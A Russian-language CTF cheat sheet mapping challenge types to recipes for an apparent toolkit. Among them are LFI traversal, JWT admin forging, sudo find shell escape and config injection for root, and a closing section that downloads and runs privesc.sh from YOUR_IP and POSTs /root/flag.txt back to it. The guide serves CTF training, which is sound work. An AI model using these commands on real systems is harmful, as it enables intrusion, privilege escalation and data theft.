# Типовые задачи и рецепты

Собрано по типовым учебным задачам. Формулировки обобщены, флаги не приводятся.

## 1. Флаг в условии
**Признак:** в тексте задачи уже приведён готовый флаг.
**Что делать:** отправить его, не тратить время.

## 1a. Не знаю, что это — пусть кит сам
**Признак:** дали файл/строку и непонятно, с чего начать.
**Рецепт:** `python toolbox.py solve <файл>` (или строку). Идёт от дешёвых шагов
к дорогим, после каждого ищет флаг и останавливается на первом.
**Полезно:** `--plan` — только список шагов; `--deep` — дорогие переборы;
`--time 180` — больше бюджета; `--log out.txt` — полный вывод.
**Честно:** если флаг на сервере (env/инстанс), solve выдаст «зацепки»
(PIN, кандидаты в ключи), а не флаг.

## 1b. Не понимаю, ЧТО передо мной
**Признак:** хочется «просто нажать кнопку», но непонятно, какой класс задачи.
**Рецепт:** `python toolbox.py hint <файл>`. Печатает: что вижу → на что похоже →
почему → что запустить → что смотреть, если не получилось.
**Зачем:** решение всё равно за тобой; hint нужен, чтобы узнать класс за 30 секунд.

## 1c. Дали ELF, надо понять поведение
**Признак:** бинарник под Linux, строк мало, статический дизасм не отвечает на вопрос.
**Рецепт:** `python linux/wsl.py run .\chall --dir` — копирует каталог в Arch WSL,
ставит `+x` и запускает; `python linux/wsl.py sh "gdb -q ~/run/chall"`,
`checksec --file=~/run/chall`.
**Зачем:** на Windows ELF не запускается; в WSL есть libc, gdb/gef, pwntools, qemu.

## 2. OSINT: фото здания/места
**Признак:** дана фотография, вопрос «что это / кто архитектор / где снято».
**Рецепт:** Яндекс.Картинки/Google Lens/TinEye → найти объект → уточнить факт
(архитектор, название, год). Ответ часто одно слово: `CTF{Foster}`.
**Подкрутить:** если не находится — обрезать фото до фасада, искать по деталям
(узор, вывеска, отражение).

## 3. OSINT: цитата + картинка
**Признак:** «найди номер архивной записи».
**Рецепт:** определить объект по фото (обратный поиск), затем искать точную цитату
в кавычках в справочниках. Номер записи — в статье.
**Формат:** `CTF{Название162}` — проверить, что регистр и транслитерация как в условии.

## 4. OSINT/forensic: время по фото
**Признак:** «на каком поезде ехал», «в какую дату».
**Рецепт:** `exiftool` → DateTimeOriginal → сопоставить с расписанием/событием.
`timeconv.py` для unix-времени.
**Ловушка:** часовой пояс; EXIF может быть UTC, а расписание местное.

## 5. Stego: DOCX с секретом
**Признак:** «в документе спрятан ключ», курсивные буквы, «зеркальные картинки».
**Рецепт:**
1. Открыть DOCX, выписать необычное форматирование (курсив → пароль).
2. `python stego/ooxml.py file.docx --extract out`
3. `strings` по `word/media/*` → флаг или подсказка.
4. Если в JPEG «пришит» ZIP: `binwalk` или `jpeg_tail.py --extract`.

## 6. Stego: две почти одинаковые картинки
**Признак:** «две одинаковые картинки никогда не идентичны», дан архив с image1/image2.
**Рецепт:** `python stego/lsb.py image2.png --diff image1.png --channel r`.
Флаг в LSB красного канала там, где картинки различаются.

## 7. Stego: alpha-канал
**Признак:** PNG RGBA, «невидимое сообщение», в stegsolve видна полоска.
**Рецепт:** `python stego/alpha.py pic.png --channel a`.
Если мусор — `--raw` и посмотреть числа: возможно, это ASCII через один.

## 8. Stego: серии символов
**Признак:** файл из миллионов `<>{}[]()`.
**Рецепт:** `python stego/runs.py file.txt --chars "<>{}[]()"`.
Длина серии = ASCII-код символа.

## 9. Stego: GIF
**Признак:** анимация, в имени файла координаты (`228x69.gif`).
**Рецепт:** `python stego/gif_frames.py a.gif 228 69 --channel r`.
**Вариант:** пароль к архиву собирается по одному символу с кадра.

## 10. Forensic: ZIP-комментарий
**Признак:** архив, внутри ничего, «следы», «записка».
**Рецепт:** `python forensic/zipmeta.py a.zip --decode` (hex → инверсия → флаг).
**Ещё:** имена файлов, даты, extra-поля, `zipinfo -z`.

## 11. Forensic: образ диска
**Признак:** `.img`, «удалённые записи», «дневник».
**Рецепт:** `file` → `mount -o loop` → смотреть файлы → `photorec` для удалённых
(искать jpg/txt) → флаг на восстановленной картинке.
**LUKS:** пароль с двумя `*` — брут 2 символа или leet-догадка (`S`→`5`, `O`→`0`).

## 11a. Forensic: файл «не того» типа
**Признак:** «фрагмент», «кусок тома», файл не открывается, но обещает архив.
**Рецепт:** `python toolbox.py auto f.bin` — покажет реальный тип, оффсет
вложенного ZIP/PNG и сразу содержимое/флаг.
**Вручную:** `python toolbox.py carve f.bin --out out` (сигнатура `50 4B 03 04`).
**Важно:** архиватор открывает ZIP не с нуля (по центральному каталогу), поэтому
«переименовать в .zip» иногда работает случайно — киту всё равно нужен carve.

## 11b. Network: скрытый канал в DNS
**Признак:** много DNS-запросов, длинные/случайные левые метки, «скрытый канал».
**Рецепт:** `python toolbox.py dns cap.pcap` — сам найдёт домен с hex/base32-
метками. Понимает и простую склейку, и структурный канал
`<session>.<index>.<hex>.<домен>`: сортирует куски по индексу, выкидывает
ретрансмиты, собирает байты и пробует zlib/gzip/bz2/lzma.
**Ключ рядом:** если в папке есть live-response (`environ.bin`, `cmdline.bin`,
конфиги), `dns` сам вытащит `SEED`/`HOST`/`KEY`/`SALT` и попробует
`sha256(seed:host)` → XOR → распаковка. Вручную:
`python toolbox.py dns cap.pcap --seed violet-parallax-77 --host orbital-node`
или `--xor-key 5e19...` / `--xor-key "пароль"`, `--out blob.bin`.
**Если пусто:** `--decode b32|b64`, `--min-len 3`, `--no-auto-keys`, смотреть
TXT-ответы и соседние артефакты; флаг может прийти **несколькими запросами**.

## 12. Network: PCAP с вопросами
**Признак:** «ответьте на вопросы» через бота: сколько хостов, кто атаковал, что прочитали.
**Рецепт:** `pcap_report.py` → разговоры; Wireshark: Follow TCP Stream, `ssh`, `data`,
`http`. Часто: nmap-скан, reverse shell на 4444, чтение `flag.txt`, добавление ssh-ключа,
удаление `.bash_history`.
**Ответы** отправить боту, он выдаст флаг.

## 13. Network: base64 в пакете
**Признак:** «аномальный пакет», «скрытый канал».
**Рецепт:** найти пакет с другим размером → скопировать payload → `enc.py`/base64.
**Вариант:** HTTP-ответ с `activation_code=<base64>`; ICMP payload; DNS checksum.

## 14. Crypto: аффинный шифр
**Признак:** числа 0..25, «известно, что текст начинается с HELLO».
**Рецепт:** `python crypto/classical.py affine --text "..." --known "AGENT"`.

## 15. Crypto: самописный XOR
**Признак:** hex-строка, «ключ по маске», известное начало текста.
**Рецепт:** `python crypto/xor_known.py --hex ... --known "This is my message: " --keylen 5`.
Ключ восстанавливается побайтово, без перебора миллионов вариантов.

## 16. Crypto: PRNG по времени
**Признак:** «пароль генерируется случайно», известен user_id и пароль другого юзера.
**Рецепт:** `prng_seed.py --ts "<время запуска>" --range 30` → получить кандидатов →
подставить/подписать.

## 17. Crypto: AES из бинарника
**Признак:** дан шифратор и файл; в Ghidra видны строки ключа/IV.
**Рецепт:** `aes_file.py --key STR --key-xor 42 --keylen 32 --iv STR2 --ivlen 16`.
Следи, как именно дополняются ключ и IV (повтор + обрезка).

## 18. Reverse: pyarmor + memdump
**Признак:** Python-программа с логином, обфусцирована pyarmor.
**Рецепт:** запустить, сделать дамп памяти (System Informer/Process Hacker),
фильтровать по `pyarmor_runtime.pyd`, искать логин/пароль рядом со строками.

## 19. Web: IDOR
**Признак:** в URL `?id=2`, есть профили.
**Рецепт:** перебор id (Burp Intruder), искать 1337/1/0, сортировать по длине ответа.

## 20. Web: отрицательная цена
**Признак:** магазин, баланс, «купи дорогой артефакт».
**Рецепт:** отправить `quantity=-10` или `price=-100`, получить баланс, купить.

## 21. Web: JWT
**Признак:** cookie/token, «войти как admin/учитель».
**Рецепт:** `jwt_tool.py decode` → искать секрет в `/log`, cookie `secret_key`, `.git` →
`jwt_tool.py forge --secret ... --sub admin --role admin`.

## 22. Web: LFI
**Признак:** `?page=`, `?file=`, «просмотр файлов».
**Рецепт:** `../../etc/passwd`, обход `%2e%2e%2f`, читать исходники, потом флаг рядом.

## 23. PWN: ret2win
**Признак:** бинарник, `strcpy`/`gets`, «вызвать секретную функцию».
**Рецепт:** `ret2win.py pattern` → оффсет → `payload --offset 80 --addr 0x...`.

## 24. PPC/Admin: автоматизация
**Признак:** «100 раундов», «8 секунд на вопрос», «сыграй 200 партий».
**Рецепт:** python + сокет; при викторине — переподключение и накопление правильных
ответов (100 вопросов в банке). Не пытайся отвечать вручную.

## 26. Crypto: RSA с общим множителем

**Признак:** в JSON/файле список модулей `n` при одном `e`, фраза «одна печать с ошибкой»,
поле `wrapped_session_key`.
**Рецепт:** у двух модулей общий простой множитель → `gcd` даёт `p` мгновенно.
```bash
python crypto/rsa_tool.py shared --json registry.json --target target --cipher-field wrapped
python crypto/rsa_tool.py shared --moduli moduli.txt --target target --e 65537 --cipher 0x...
```
**Подводный камень:** расшифрованный ключ — это число; в байты переводить
`int.to_bytes`, а не `bytes.fromhex(str(m))`, иначе следующий слой SHA-256 даст мусор.

## 27. Crypto: самодельный потоковый шифр

**Признак:** `stream = SHA-256(key || nonce || counter_be_32)`, XOR с ciphertext.
**Рецепт:**
```bash
python crypto/stream_sha256.py --cipher <hex> --key <hex> --nonce <hex>
python crypto/stream_sha256.py --cipher <hex> --key <...> --nonce <...> --brute
```
`--brute` перебирает hex/base64/raw для key и nonce, counter 4/8 байт, big/little,
старт 0/1 и sha256/sha1/md5. Смотри на строки с печатным текстом.

## 28. Network: Minecraft-сессия

**Признак:** PCAP + `latest.log`, мод `netdebug`, строки `cipher enabled: ... secret=...`.
**Рецепт:**
```bash
python network/tcp_reassemble.py cap.pcap --dump streams
python network/mc_decrypt.py cap.pcap --log latest.log --dump packets.jsonl
```
Скрипт сам собирает TCP по seq, находит границу шифрования (после Encryption
Response/Request), перебирает ключи и смещения, парсит пакеты с zlib.
Дальше смотри частые `pid`: координаты → `mc_blocks.py` + `bitmap_font.py`.

## 29. Forensic: мобильный бэкап + трафик

**Признак:** `settings_secure.xml`, `device.xml`, `app-log.txt`, `messages.db`, UDP-дамп.
**Рецепт:**
1. `python forensic/artifact_hunt.py dump --zip --context 1` — найти `seed`, `android_id`, ключи.
2. `python network/udp_payloads.py cap.pcap --sep /`.
3. Перебрать 8 вариантов: seed hex/base64/raw × android_id hex/raw × nonce hex/raw.
4. Расшифровать `stream_sha256.py --brute`.

## 30. Linux: sudo + штатная утилита

**Признак:** `sudo -l` → `(root) NOPASSWD: /usr/bin/find`.
**Рецепт:** `python linux/gtfobins.py --check find`, затем
`sudo find . -exec /bin/sh \; -quit`. Для base64/less/vim/tar — там же.

## 31. Linux: записываемый конфиг у root-скрипта

**Признак:** скрипт запускается через sudo и делает `source /srv/.../runtime.conf`,
а конфиг доступен на запись твоей группе.
**Рецепт:**
```bash
python linux/script_audit.py /usr/local/sbin/reconcile --check-writable
echo 'cat /root/flag > /tmp/flag.out' >> /srv/ledger/runtime.conf
sudo /usr/local/sbin/reconcile && cat /tmp/flag.out
```

## 32. Linux: кастомная оболочка / mTLS

**Признак:** вместо bash — `treaty>`, команды `help, ports, unit, journal, read, extract, connect`.
**Рецепт:** `read` скрипта генерации пароля → прочитать входные файлы → вычислить
пароль локально (тот же `sha256sum | cut`) → `extract <pass>` → `connect` →
команда архива (часто `FETCH <эпоха>`). Пароль считается из `machine-id`, слота
и т.п. — главное повторить формат строки один в один.

## 33. Network: UDP и самодельный протокол

**Признак:** в дампе 2–3 UDP-пакета, payload начинается с ASCII-сигнатуры
(`MOBILE/`, `PKT/`, `v1/`).
**Рецепт:** `python network/udp_payloads.py cap.pcap --sep / --signature MOBILE/`.
Скрипт печатает поля, пробует hex/base64/raw и ищет флаг. Дальше — собрать
key/nonce/ciphertext и расшифровать.

## 34. Stego: пиксель-арт из координат

**Признак:** много пакетов/строк с координатами, холст высотой 5, шрифт 5×5.
**Рецепт:**
```bash
python stego/bitmap_font.py points.csv --ascii --flip-y --decode --lower
python stego/bitmap_font.py points.csv --legend        # если автодекод не сошёлся
```
Если Y растёт вверх — `--flip-y`. Свой шрифт — `--font font.json`.
число глифов = числу символов; пробелы между глифами — пустые колонки.

## 35. Crypto: один поток дважды (two-time pad)

**Признак:** два шифротекста, «использован один ключ/поток», XOR.
**Рецепт:**
```bash
python crypto/otp_reuse.py --c1 <hex> --c2 <hex> --crib "the "
```
`c1^c2 = p1^p2`; скрипт подставляет crib и показывает места, где второй текст
остаётся печатным. Дальше расширяй crib (`flag{`, `CTF{`, `password`) и собирай оба текста.

## 36. Forensic: Android-выгрузка

**Признак:** `settings_secure.xml`, `device.xml`, `app-log.txt`, `messages.db`,
`notifications.txt`.
**Рецепт:**
```bash
python forensic/android_backup.py dump --json android.json
```
Скрипт вытаскивает `android_id`, `seed`, `nonce`, ключи, таблицы SQLite и строки
из логов. Дальше — расшифровка трафика этими параметрами.

## 37. Stego: PNG-чанки

**Признак:** PNG, «текст спрятан в метаданных», странный размер.
**Рецепт:**
```bash
python stego/png_chunks.py pic.png --extract chunks
```
Смотри `tEXt`, `zTXt`, `iTXt`, нестандартные типы и хвост после `IEND`.

## 38. Network: DNS-туннель и HTTP-объекты

**Признак:** сотни DNS-запросов с длинными левыми метками; или HTTP-дамп,
где нужно достать тело ответа/файл.
**Рецепт:**
```bash
python network/dns_tunnel.py cap.pcap --domain exfil.test
python network/pcap_http.py cap.pcap --out objects
```
DNS-скрипт склеивает метки и пробует hex/base32/base64. HTTP-скрипт собирает
потоки по seq, парсит `Content-Length` и складывает тела в файлы.

## 39. Web: быстрый прогон параметров

**Признак:** форма/URL с параметрами, надо быстро понять, что ломается.
**Рецепт:**
```bash
python web/param_probe.py "http://host/item?id=1" --cookie "token=..."
```
Скрипт сравнивает статус/длину/хеш текста с базой и показывает только отличия:
SQLi-кавычка, SSTI, path traversal, отрицательные числа и т.п.

## 40. PWN: что за защиты

**Признак:** дали бинарник, надо понять, с чего начинать.
**Рецепт:**
```bash
python pwn/checksec.py ./bin
```
PIE/NX/Canary/RELRO сразу говорят, реально ли переполнение и нужен ли ret2win.
Для PE — ASLR/NX/CFG.

## 41. PWN: format string

**Признак:** `printf(user_input)`, «утечка», «запись по адресу».
**Рецепт:**
```bash
python pwn/fmtstr.py find --count 40      # отправить, найти индекс
python pwn/fmtstr.py scan --connect h:p --deref   # прогнать по сервису и найти %N$s
python pwn/fmtstr.py leak --index 7       # %7$p
python pwn/fmtstr.py write --addr 0x404060 --value 0x1337 --index 10
```
**Если флаг в env** (`getenv("CTF_FLAG")`): перебором индексов `%N$s` в сервисе
часто находится указатель на окружение — смотри, что печатается.

## 41a. PWN: сервис-оракул (N раундов)

**Признак:** «пройди 100 раундов», «ответь на вопросы», «YES/NO», числа.
**Рецепт:**
```bash
python pwn/oracle.py --connect h:1337 --peek            # что спрашивает
python pwn/oracle.py --connect h:1337 \
  --match "(\d+) +(\d+)" --expr "gcd(a,b) == 1" \
  --send-expr "'YES' if v else 'NO'" --repeat 200
```
Меняется только `--expr`/`--send-expr`; группы regex доступны как `a`, `b`, …
(и `n1`, `n2`, `nums`, `v`), плюс `gcd`, `lcm`, `is_prime`, `modinv`, `pow`.
`--log t.txt` сохраняет транскрипт, `--until` останавливает по regex.
Локальная программа вместо сети: `--local "python srv.py"`.

## 41b. RSA: дали кучу чисел

**Признак:** файл/текст с `n`, `e`, `c`, иногда `p`, `q`, два модуля, hex-блоки.
**Рецепт:** `python toolbox.py rsa auto task.txt` — сам вытащит числа, угадает
роли и прогонит: малую `e` (включая `c + k·n`), gcd между модулями, Ферма,
`p−1`, rho, Винера, готовые `p`/`q`; покажет все расшифровки и флаги.
**Если пусто:** проверь, что `e` маленькое, а `c` — это именно число
(иногда оно в base64/hex); Coppersmith и решётки требуют Sage.
**То же в автопилоте:** `python toolbox.py solve task.txt` — шаг `rsa` идёт сам.

## 42. Reverse: упакованный Python
**Признак:** exe/pyz, внутри `pyarmor`, `PYZ`, `_MEIPASS`.
**Рецепт:**
```bash
python reverse/py_pack.py app.exe
```
Дальше: pyinstxtractor → pycdc; для pyarmor — дамп памяти и поиск `pyarmor_runtime`.

## 43. Web: JWT и SSTI

**Признак:** токен в cookie; параметр, который отражается на странице.
**Рецепт:**
```bash
python web/jwt_brute.py "<token>" --wordlist words.txt --forge-sub admin
python web/ssti_probe.py "http://host/?q=1"
```
SSTI-скрипт сам скажет, какой движок: `{{7*7}}` → 49 и т.п.

## 44. Stego: звук и QR

**Признак:** WAV/MP3, «спрятано в звуке»; или картинка с квадратом.
**Рецепт:**
```bash
python stego/audio_spectrum.py sound.wav --peaks
python stego/qr_scan.py pic.png
```
Спектрограмма рисуется без matplotlib; QR ищется с увеличением, инверсией и OTSU.

## 45. Forensic: APK

**Признак:** `.apk`, «мобильное приложение».
**Рецепт:**
```bash
python forensic/apk_info.py app.apk --extract out
```
Скрипт покажет структуру, строки manifest, URL и подозрительные ключи;
дальше — `jadx`/`apktool`, если нужно глубже.

## 46. Crypto: «ничего не подходит»

**Признак:** перебрал очевидное, непонятно, чем шифровали.
**Рецепт:**
```bash
python crypto/autocrack.py --hex <...>
python crypto/autocrack.py --file enc.bin --deep
```
Скрипт рекурсивно снимает кодировки и перебирает Цезаря, аффинный, XOR (1 байт и
повторяющийся), rail fence, ROT47 и Виженера, печатает ranked-варианты с цепочкой
преобразований. Если флаг найден — он сверху.

Хеш:
```bash
python crypto/autocrack.py --hash <hash>
python crypto/autocrack.py --hash-file hashes.txt --wordlist auto --rules
```
Ищет словарь в стандартных местах, если не нашёл — встроенный мини-список.

## 47. Crypto: шифротекст + материалы рядом

**Признак:** есть `enc.bin` и рядом записка, лог, JSON, папка с файлами — возможно,
оттуда берётся ключ.
**Рецепт:**
```bash
python crypto/megacrack.py --cipher-file enc.bin --material note.txt
python crypto/megacrack.py --cipher-file enc.bin --material-dir dump --deep
```
Скрипт собирает токены из строк, `KEY=VALUE`, JSON-скаляров, hex/base64-блоков и имён
файлов; делает из них ключи (raw, lower/upper, hex/base64-декод, md5/sha1/sha256,
пары через concat/`:`/`_`/`-`, xor) и перебирает XOR, RC4, AES-ECB/CBC, SHA256-поток
и Виженер. В выводе — цепочка «материал → ключ → шифр» и найденные флаги.

**Подводные камни:**
- ключ `SHA256(seed || android_id)` — просто положи оба поля в JSON рядом;
- ключ в имени файла — `--material-dir` учитывает имена;
- IV может быть нулевым, ключом или md5(ключа) — все три варианта перебираются.

## 48. «Дали что-то, непонятно что»

**Признак:** есть папка/файлы/строка, неясно, где шифротекст, где ключ и есть ли они.
**Рецепт:**
```bash
python megaall.py --dir dump
python megaall.py --file enc.bin --file note.txt --deep
python megaall.py --text "что-то" --hex ...
```
Скрипт сам:
1. собирает артефакты (файлы, zip, строки, JSON, hex/base64, имена);
2. ищет готовые флаги и хеши (и пытается подобрать по словарю);
3. выбирает кандидатов в шифротекст;
4. гоняет кодировки + autocrack + ключи из материалов + megacrack;
5. пробует RSA (общий множитель, Ферма, малая экспонента);
6. печатает ranked-кандидаты с флагами.

Без аргументов сканирует текущую папку.

## 49. Только пробелы, табы и невидимые символы

**Признак:** файл выглядит пустым; в тексте ZWSP/ZWNJ/ZWJ, variation selectors,
braille, хвостовые пробелы.
**Рецепт:**
```bash
python stego/whitespace.py file.txt
python stego/whitespace.py file.txt --mode ws
python stego/whitespace.py file.txt --mode zw
```
`ws` — настоящий интерпретатор Whitespace; `bits` — space/tab как биты;
`zw`/`vs`/`tags`/`braille`/`trail` — соответствующие каналы.

## 50. Эзотерические языки

**Признак:** `+-<>[].,`, `Ook. Ook?`, `MoO`, `@`/`v`/`"`, `idso`.
**Рецепт:**
```bash
python stego/esolang.py file.bf
python stego/esolang.py file.ook --lang ook
python stego/esolang.py file.bef --lang befunge
```
Поддержаны Brainfuck, Ook!, Cow, Befunge-93, Deadfish, Whitespace. Если автодетект
не сработал — укажи `--lang`.

## 51. Редкие шифры и кодировки

**Признак:** цифры 1–26, группы A/B по 5, пары 1–5, `xn--`, `=XX`, base58-алфавит,
буквы ADFGX.
**Рецепт:**
```bash
python crypto/obscure.py auto --text "..."
python crypto/obscure.py adfgx --text "..." --key SECRET
python crypto/obscure.py bifid --text "..." --key SECRET --period 5
python crypto/obscure.py porta --text "..." --key SECRET
python crypto/obscure.py hill --text "..." --matrix 3,3,2,5
```
Auto пробует base58/62/91/85, base32hex, uuencode, quoted-printable, punycode,
Unicode escapes, HTML entities, A1Z26, Bacon, tap code, Polybius, keyboard shift.

## 52. Reverse: «разбери бинарник целиком»

**Признак:** дали ELF/PE/pyc/APK, непонятно, с чего начать и где ключ.
**Рецепт:**
```bash
python reverse/megarev.py --file ./bin
python reverse/megarev.py --file ./app.exe --deep
python reverse/megarev.py --dir dump --out carved
```
Что делает: тип и защиты (PIE/NX/Canary/RELRO), упаковщики (UPX/PyInstaller/pyarmor/
Nuitka/.NET/Electron/Go/Rust), энтропия и оверлей, строки ASCII/UTF-16, вложенные
файлы по сигнатурам, pyc-константы и дизассемблер (без запуска), XOR-скан и
перебор ключей из строк по найденным блобам (XOR/RC4/AES/…).

Если флаг лежит в расшифрованном хвосте среди бинарного мусора — он всё равно
попадёт в `=== ФЛАГИ ===`, даже если общий текст нечитаемый.

## 53. Docker / контейнер

**Признак:** `/.dockerenv`, `docker.sock`, `image.tar`, открытый 2375, privileged.
**Рецепт:**
```bash
bash linux/docker_audit.sh
python forensic/docker_image.py image.tar --out fs
python network/docker_api.py --host http://ip:2375 --list
```
`docker_audit` покажет capabilities, сокет, монтирования, cgroup, host PID, секреты.
`docker_image` разберёт слои и whiteouts (удалённые файлы), history/env и вытащит
секреты/флаги. `docker_api` — версия, контейнеры, env, логи, exec.

Побег и техники — `linux/DOCKER.md`: docker.sock, privileged, release_agent,
core_pattern, nsenter, host-пути.

## 54. Git-репозиторий

**Признак:** дали папку с `.git`, бэкап репозитория.
**Рецепт:**
```bash
python forensic/git_hunt.py repo --all-objects
```
Покажет коммиты, remotes, флаги/секреты в истории, удалённые файлы, dangling,
stash, креды в URL.

## 55. Браузерный профиль

**Признак:** `History`, `Cookies`, `Login Data`, `places.sqlite`.
**Рецепт:**
```bash
python forensic/browser_artifacts.py "C:\Users\user\AppData\Local\Google\Chrome\User Data"
```
История, куки, логины, закладки, автозаполнение. Куки/пароли Chrome зашифрованы —
показываются как есть.

## 56. Windows-артефакты

**Признак:** дамп `C:\Windows`, hives, EVTX, Prefetch, LNK.
**Рецепт:**
```bash
python forensic/windows_triage.py dump
```
Ищет Run/RunOnce, пути, URL, учётки, IP, флаги в hive/EVTX/Prefetch/LNK.

## 57. Office/PDF

**Признак:** DOCX/XLSX/PPTX/DOC/PDF/RTF, «макросы», «вложенное».
**Рецепт:**
```bash
python forensic/office_docs.py doc.docx --out out
python forensic/office_docs.py doc.pdf
```
Макросы (vbaProject.bin), embeddings, externalLinks, `/JS`, `/OpenAction`,
`/EmbeddedFiles`, URI, флаги.

## 58. Облачные ключи

**Признак:** `.aws/credentials`, service account JSON, connection strings.
**Рецепт:**
```bash
python forensic/cloud_creds.py dump --metadata
```
AWS/GCP/Azure ключи, service account, metadata 169.254.169.254.

## 59. Kubernetes

**Признак:** под, service account token, `KUBERNETES_SERVICE_HOST`.
**Рецепт:**
```bash
bash linux/k8s_audit.sh
python network/k8s_api.py --host https://ip:6443 --token T --list
python network/k8s_api.py --host ... --token T --secrets
```

## 60. WAV: DTMF и морзе

**Признак:** звук, «набирает номер», пикает.
**Рецепт:**
```bash
python stego/audio_tools.py sound.wav --mode dtmf
python stego/audio_tools.py sound.wav --mode morse
```

## 61. Язык бинарника

**Признак:** exe/jar/dex/Go, непонятно, чем decompile.
**Рецепт:**
```bash
python reverse/lang_info.py app.exe
```
Скажет .NET/Java/Android/Go/Rust/Electron/Python и чем открывать.

## 62. RSA: малая d и Hastad

**Признак:** маленькая закрытая экспонента или одно `e` и несколько `n/c`.
**Рецепт:**
```bash
python crypto/rsa_tool.py wiener --n ... --e ... --cipher ...
python crypto/rsa_tool.py broadcast --e 3 --pairs "n:c" --pairs "n:c" --pairs "n:c"
```

## 63. Флаги в файлах `flag`, `flag.txt`, `flag_<random>`

**Признак:** на машине/в дампе есть файлы с `flag` в имени.
**Рецепт:**
```bash
bash linux/flag_hunt.sh
python forensic/flag_hunt.py dump
```
Ищет `flag`, `flag.txt`, `flag_<random>`, `*flag*`, `user.txt`, `root.txt`,
а также `CTF{...}` в небольших текстовых файлах. Показывает путь, права, размер и head.

## 64. Как закинуть скрипт на сервер

**Признак:** есть шелл, но нет файлов; надо запустить `privesc.sh`/`flag_hunt.sh`.
**Рецепт:**
```bash
# у себя
python network/serve.py --dir . --port 8000 --upload --token s3cr3t
# на цели
curl -O http://YOUR_IP:8000/linux/privesc.sh
bash privesc.sh
# забрать флаг
curl -X POST --data-binary @/root/flag.txt 'http://YOUR_IP:8000/flag.txt?token=s3cr3t'
```
Все способы (curl/wget/python/perl/nc/base64/ssh/scp/docker/kubectl) — `linux/TRANSFER.md`.
